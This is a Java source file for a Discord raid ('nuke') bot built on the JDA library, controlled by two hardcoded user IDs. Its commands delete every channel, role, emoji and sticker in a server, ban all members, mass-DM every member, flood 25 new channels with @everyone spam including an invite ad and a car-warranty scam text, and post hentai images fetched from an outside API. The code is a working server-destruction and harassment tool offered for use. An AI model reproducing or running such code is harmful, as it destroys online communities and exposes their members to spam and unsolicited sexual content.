package wtf.gun.maou;

import com.google.gson.JsonParser;
import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.dv8tion.jda.api.utils.cache.CacheFlag;
import org.jetbrains.annotations.NotNull;

import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

public final class Bot {

    private final Dotenv config;

    public Bot() throws InterruptedException {
        config = Dotenv.configure().load();
        String token = config.get("TOKEN");
        String status = config.get("STATUS");
        // Input bot token
        JDA jda = JDABuilder.createDefault(token)
                // Set activity of bot
                .setActivity(Activity.watching(status))
                .setChunkingFilter(ChunkingFilter.ALL)
                .setMemberCachePolicy(MemberCachePolicy.ALL)
                .enableCache(CacheFlag.FORUM_TAGS)
                .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                // Initialize commands
                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez(), new Car(), new Stop(), new Dm())
                .build()
                .awaitReady();
    }

    public Dotenv getConfig() {
        return config;
    }

    private static boolean stop = false;
    private static final List<String> allowedUsers = new ArrayList<>();
    static {
        allowedUsers.add("993192453534400612");
        allowedUsers.add("259780560707256321");
    }

    private static final class Stop extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!stop")) return;
            Guild guild = event.getGuild();

            stop = true;

            try {
                Thread.sleep(200);
                stop = false;
                System.out.println("[LOG] Successfully stopped all actions.");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

        }
    }

    // Attempts to mass dm all server members
    private static final class Dm extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!dm")) return;
            Guild guild = event.getGuild();

            StringBuilder content = new StringBuilder();

            boolean pass = false;
            for (String string : event.getMessage().getContentRaw().split(" ")) {
                if (!pass) {
                    pass = true;
                    continue;
                }
                content.append(string).append(" ");
            }

            guild.getMembers().forEach(member -> {
                if (member.getUser().isBot()) {
                    return;
                }
                member.getUser().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage(content.toString()).queue());
            });

            event.getMessage().delete().queue();
        }
    }

    // Create x channels and spam message x times in each channel
    private static final class Create extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!hi")) return;
            Guild guild = event.getGuild();


            // For loop to create channels
            for (int i = 0; i < 25; i++) {
                if (stop) {
                    break;
                }
                guild.createTextChannel("beamed-by-root").queue(textChannel -> {
                    // For loop to spam message in channels
                    for (int j = 0; j < 50; j++) {
                        if (stop) {
                            break;
                        }
                        try {
                            textChannel.sendMessage("@everyone\n wtf is this dead discord join discord.gg/1hunna").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                        } catch (Exception ignored) {
                        }
                    }
                });
            }
            event.getMessage().delete().queue();
        }
    }

    // Create x channels and spam message x times in each channel
    private static final class Car extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!car")) return;
            Guild guild = event.getGuild();


            // For loop to create channels
            for (int i = 0; i < 25; i++) {
                if (stop) {
                    break;
                }
                guild.createTextChannel("car-beep-beep").queue(textChannel -> {
                    // For loop to spam message in channels
                    for (int j = 0; j < 50; j++) {
                        if (stop) {
                            break;
                        }
                        try {
                            textChannel.sendMessage("@everyone\n We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.\nhttps://i.imgur.com/MziC6lA.jpg").queue(text -> System.out.println("[LOG] Spamming in " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                        } catch (Exception ignored) {
                        }
                    }
                });
            }
            event.getMessage().delete().queue();
        }
    }

    // Create x roles
    private static final class Rolez extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!rolez")) return;
            Guild guild = event.getGuild();

            Random random = new Random();

            // For loop to create roles
            for (int i = 0; i < 25; i++) {
                if (stop) {
                    break;
                }
                StringBuilder builder = new StringBuilder();
                int color = random.nextInt();

                for (int j = 0; j < 20; j++) {
                    if (stop) {
                        break;
                    }
                    char c = (char) (random.nextInt(26) + 'a');
                    builder.append(c);
                }

                guild.createRole().setName(builder.toString().toUpperCase()).setColor(color).queue(role -> role.createCopy().queue(roley -> System.out.println("[LOG] Created role " + role.getName() + " [" + role.getId() + "]")));
            }
            event.getMessage().delete().queue();
        }
    }

    // NO LONGER USED - using an api for hentai images instead
    public static String getRandomItem(List<String> list) {
        return list.get(ThreadLocalRandom.current().nextInt(list.size()));
    }

    // Create x channels and spam hentai x times in each channel
    private static final class Hentai extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!anime")) return;
            Guild guild = event.getGuild();


            // NO LONGER USED - using an api for hentai images instead
            // cycle through list of porn images to spam
/*            List<String> lines = new ArrayList<>();

            try (BufferedReader reader = new BufferedReader(new FileReader("random.txt"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    lines.add(line);
                }
            } catch (IOException e) {
                // Handle the exception
            }*/

            // For loop to create channels
            for (int i = 0; i < 1; i++) {
                if (stop) {
                    break;
                }
                guild.createTextChannel("anime").queue(textChannel -> {
                    // For loop to spam prn in channels
                    for (int j = 0; j < 50; j++) {
                        if (stop) {
                            break;
                        }

                        // Read data from api and use to spam images
                        StringBuilder builder = new StringBuilder();
                        try {
                            URL url = new URL("http://api.nekos.fun:8080/api/hentai");
                            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
                            String line;
                            while ((line = reader.readLine()) != null) {
                                builder.append(line);
                            }
                        } catch (IOException e) {
                        }

                        String json = JsonParser.parseString(builder.toString()).getAsJsonObject().get("image").getAsString();

                        textChannel.sendMessage("@everyone\n" + json).queue(text -> System.out.println("[LOG] Sent Hentai to " + textChannel.getName() + " [" + textChannel.getId() + "]"));
                        // add delay
                        try {
                            Thread.sleep(200);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                        }
                    }
                });
            }
            event.getMessage().delete().queue();
        }
    }

    // Delete all channels, emojis, stickers, roles, ban all members
    private static final class Nuke extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!yeet")) return;
            Guild guild = event.getGuild();

            // Check if there is channels and delete them
            if (guild.getChannels().size() > 1) {
                guild.getChannels().forEach(guildChannel -> {
                    if (stop) {
                        return;
                    }
                    guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                });
            } else {
                System.out.println("[LOG] No channels found.");
            }

            // Check if there is emojis/stickers and delete them
            if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
                guild.getEmojis().forEach(richCustomEmoji -> {
                    if (stop) {
                        return;
                    }
                    richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
                });
                guild.getStickers().forEach(guildSticker -> {
                    if (stop) {
                        return;
                    }
                    guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                });
            } else {
                System.out.println("[LOG] No emojis/stickers found.");
            }

            // Check if there are roles and delete them
            guild.getRoles().forEach(role -> {
                if (stop) {
                    return;
                }
                try {
                    if (guild.getRoles().size() > 1) {
                        role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                    } else {
                        System.out.println("[LOG] No roles found.");
                    }
                } catch (HierarchyException ignored) {

                }
            });

            // Check if there are members and ban them (if bannable)
            guild.getMembers().forEach(member -> {
                if (stop) {
                    return;
                }
                try {
                    if (guild.getMembers().size() > 1) {
                        member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                    } else {
                        System.out.println("[LOG] No members found.");
                    }
                } catch (HierarchyException ignored) {

                }
            });

        }
    }

    // Delete all emojis and stickers
    private static final class Emoji extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nomoji")) return;
            Guild guild = event.getGuild();


            if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
                guild.getEmojis().forEach(richCustomEmoji -> {
                    if (stop) {
                        return;
                    }
                    richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
                });
                guild.getStickers().forEach(guildSticker -> {
                    if (stop) {
                        return;
                    }
                    guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
                });
            } else {
                System.out.println("[LOG] No emojis/stickers found.");
            }

            event.getMessage().delete().queue();
        }
    }

    // Delete all channels
    private static final class Channel extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nochan")) return;
            Guild guild = event.getGuild();


            if (guild.getChannels().size() > 1) {
                guild.getChannels().forEach(guildChannel -> {
                    if (stop) {
                        return;
                    }
                    guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
                });
            } else {
                System.out.println("[LOG] No channels found.");
            }
        }
    }

    // Delete all roles
    private static final class Role extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!norole")) return;
            Guild guild = event.getGuild();


            guild.getRoles().forEach(role -> {
                if (stop) {
                    return;
                }
                try {
                    if (guild.getRoles().size() > 1) {
                        role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
                    } else {
                        System.out.println("[LOG] No roles found.");
                    }
                } catch (HierarchyException ignored) {

                }
            });

            event.getMessage().delete().queue();
        }
    }

    // Ban all memebrs (if bannable)
    private static final class Member extends ListenerAdapter {
        @Override
        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
            if (!event.isFromGuild() || !allowedUsers.contains(event.getMember().getId()) || !event.getMessage().getContentRaw().contains("!nomem")) return;
            Guild guild = event.getGuild();


            guild.getMembers().forEach(member -> {
                if (stop) {
                    return;
                }
                try {
                    if (guild.getMembers().size() > 1) {
                        member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
                    } else {
                        System.out.println("[LOG] No members found.");
                    }
                } catch (HierarchyException ignored) {

                }
            });

            event.getMessage().delete().queue();
        }
    }

}
